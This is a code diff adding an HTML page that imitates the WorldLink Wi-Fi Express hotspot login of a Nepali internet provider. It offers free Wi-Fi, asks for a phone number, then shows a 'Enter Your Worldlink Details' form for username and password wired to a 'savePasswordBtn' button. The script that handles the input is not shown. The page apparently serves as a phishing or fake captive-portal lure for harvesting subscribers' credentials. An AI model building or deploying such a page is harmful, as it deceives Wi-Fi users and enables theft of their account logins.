@@ -1,0 +1,85 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>WorldLink Login</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <!-- Bootstrap for responsive base -->
+  <link
+    href="https://cdn.jsdelivr.net/npm/bootstrap@5.4.0/dist/css/bootstrap.min.css"
+    rel="stylesheet"
+  >
+  <link href="css/style.css" rel="stylesheet">
+</head>
+<body>
+  <nav>
+    <img src="worldlink.jpeg" alt="WorldLink Logo">
+    <div id="button">
+      <button id="getOnlineButton">Get Online</button>
+    </div>
+  </nav>
+
+  <div id="optionsModal" class="modal">
+    <div class="modal-content">
+      <span class="close">&times;</span>
+      <h2>Login to WorldLink Wi-Fi Express</h2>
+      <div class="option free-wifi">
+        <h3 style="color: green;">Connect for Free Wi-Fi</h3>
+        <p id="p">Free 500 MB pack… in 14 000+ Hotspots all over Nepal.</p>
+        <a href="#" class="connect" id="connectFreeWiFi">Connect</a>
+      </div>
+      <div class="option worldlink-user">
+        <h3 style="color: yellow;">I'm a WorldLink User</h3>
+        <p>Exclusively enjoy free unlimited internet.</p>
+        <a href="#" class="connect" id="connectWorldLinkUser">Connect</a>
+      </div>
+    </div>
+  </div>
+
+  <div id="loginModal" class="modal">
+    <div class="modal-content">
+      <span class="close">&times;</span>
+      <h2>Login to WorldLink Wi-Fi Express</h2>
+      <form class="login-form">
+        <div class="d-flex mb-3">
+          <select class="form-select rounded-start">
+            <option value="+977">+977</option>
+          </select>
+          <input
+            type="text"
+            id="phoneNumber"
+            class="form-control rounded-end"
+            placeholder="Phone Number"
+            required
+          >
+        </div>
+        <button type="submit" class="btn btn-primary w-100">Send code</button>
+        <p class="small mt-2">
+          By clicking "Login", you agree to our Terms of Use and Privacy Policy.
+        </p>
+      </form>
+    </div>
+  </div>
+
+  <div id="passwordModal" class="modal">
+    <div class="modal-content">
+      <span class="close">&times;</span>
+      <div class="container">
+        <div class="login-box">
+          <h1>Worldlink</h1>
+          <h2>Enter Your Worldlink <span class="highlight">Details</span></h2>
+          <form id="passwordForm">
+            <input type="text" id="username" placeholder="Username" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit" id="savePasswordBtn">Submit</button>
+          </form>
+          <div id="messageBox" class="message-box"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.4.0/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="js/main.js"></script>
+</body>
+</html>
